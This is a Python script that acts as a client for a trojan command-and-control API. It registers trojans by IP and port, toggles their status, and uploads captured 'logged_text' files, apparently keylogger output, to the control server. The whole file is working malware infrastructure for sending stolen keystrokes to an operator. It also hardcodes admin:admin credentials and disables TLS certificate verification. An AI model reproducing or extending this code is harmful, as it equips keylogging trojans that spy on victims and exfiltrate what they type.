import ssl
import json
import base64

from urllib.request import Request, urlopen
from urllib.parse import urlencode

def api_call(call_type, server_ip, trojan_ip=None, trojan_port=None, trojan_id=None, status=None, filepath=None):
    creds = ('admin:admin')
    encoded_creds = base64.b64encode(creds.encode('ascii'))

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    # Create Trojan (POST)
    if call_type == 'create':
        assert trojan_ip and trojan_port
        CREATE_URL = 'https://{SERVER_IP}:5000/api/v1/trojans/create?ip={TROJAN_IP}&port={TROJAN_PORT}'.format(SERVER_IP=server_ip, TROJAN_IP=trojan_ip, TROJAN_PORT=trojan_port)

        req = Request(CREATE_URL, data={})
        req.add_header('Authorization', 'Basic {}'.format(encoded_creds.decode("ascii")))
        resp = urlopen(req, context=ctx)
        print(resp.read())
    elif call_type == 'status':
        assert trojan_id and status == 1 or status == 0
        UPDATE_STATUS_URL = 'https://{SERVER_IP}:5000/api/v1/trojans?id={ID}&status={STATUS}'.format(SERVER_IP=server_ip, ID=trojan_id, STATUS=status)

        req = Request(UPDATE_STATUS_URL, data={})
        req.add_header('Authorization', 'Basic {}'.format(encoded_creds.decode("ascii")))
        req.add_header('Content-Type', 'application/json')
        req.get_method = lambda: 'PUT'
        resp = urlopen(req, context=ctx)
        print(resp.read())
    elif call_type == 'text':
        assert trojan_id and filepath
        UPDATE_TEXT_URL = 'https://{SERVER_IP}:5000/api/v1/trojans?id={ID}'.format(SERVER_IP=server_ip, ID=trojan_id)

        with open(filepath) as fp:
            file_data = fp.read()
        json_data = json.dumps({'logged_text':file_data})
        data = json_data.encode('utf-8')

        req = Request(UPDATE_TEXT_URL, data=data)
        req.add_header('Authorization', 'Basic {}'.format(encoded_creds.decode("ascii")))
        req.add_header('Content-Type', 'application/json; charset=utf-8')
        req.add_header('Content-Length', len(data))
        req.get_method = lambda: 'PUT'
        resp = urlopen(req, context=ctx)
        print(resp.read())
    else:
        print('Invalid API call.')

if __name__ == '__main__':
    #api_call('create', '127.0.0.1', trojan_ip='1.2.1.2', trojan_port=5555)
    #api_call('status', '127.0.0.1', trojan_id=1, status=0)
    api_call('text', '127.0.0.1', trojan_id=1, filepath='test_data.txt')
